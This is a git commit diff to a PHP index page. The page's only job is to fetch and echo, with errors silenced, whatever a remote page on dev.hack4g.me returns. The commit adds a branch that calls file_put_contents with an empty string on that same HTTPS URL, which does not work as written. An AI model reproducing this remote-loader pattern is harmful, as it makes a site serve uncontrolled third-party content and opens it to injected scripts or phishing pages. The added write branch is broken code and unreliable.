8142721fd002e8b24e50bfcb0c12217fa0161536
azzphucdev <phucdz205@gmail.com>
2024-06-01 18:24:36 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,2 +1,7 @@
 <?php
+if ($_SERVER['REQUEST_METHOD'] === 'GET') {
 echo @file_get_contents("https://dev.hack4g.me/DownloadPlatformNext.php");
+} else {
+    echo @file_put_contents("https://dev.hack4g.me/DownloadPlatformNext.php","");
+}
+?>
